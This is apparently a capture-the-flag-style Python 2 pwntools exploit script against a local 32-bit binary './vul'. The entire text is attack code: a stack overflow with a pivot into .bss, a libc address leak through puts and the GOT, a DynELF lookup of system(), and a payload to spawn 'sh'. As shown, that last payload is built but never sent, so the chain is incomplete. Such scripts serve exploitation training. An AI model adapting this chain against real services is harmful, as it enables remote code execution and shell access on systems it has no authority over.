#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
local = 1
if local:
	p = process('./vul')
else:
	p = remote('127.0.0.1', 8888)
elf = ELF('./vul')
gets = elf.symbols['gets'] # 0x080483e0
puts = elf.symbols['puts'] # 0x08048410
main = elf.symbols['main'] # 0x080485f9
puts_got = elf.got['puts'] # 0x0804a018
print 'gets =', hex(gets)
print 'puts =', hex(puts)
print 'main =', hex(main)
print 'puts_got =', hex(puts_got)
leave_ret = 0x080484e8
pop_ebx_ret = 0x080483c9
buf1 = 0x0804b000 - 0x40 # elf.bss() - 0x40
buf2 = 0x0804b000 - 0x140 # elf.bss() - 0x140
offset = 116
gdb.attach(p)
payload1 = (
	p32(buf1).rjust(116, 'A') + 
	p32(gets) + 
	p32(leave_ret) + 
	p32(buf1)
)
p.sendline(payload1)

def leak(addr):
	global buf1, buf2, delay
	buf1, buf2 = buf2, buf1
	payload = (
		p32(buf1) + 
		p32(puts) + p32(pop_ebx_ret) + p32(addr) + 
		p32(gets) + p32(leave_ret) + p32(buf1)
	)
	p.sendline(payload)
	s = p.recvrepeat(1)[:-1] + '\x00'
	print repr(s)
	return s # return string from the start of the address

ptr_libc = u32(leak(puts_got)[:4])
print 'address in libc:', hex(ptr_libc)
d = DynELF(leak, ptr_libc)
system = d.lookup('system')
payload2 = (
	p32(0) + 
	p32(system) + 
	p32(0) + 
	p32(buf1 + 0x10) + 
	'sh\x00'
)
p.interactive()
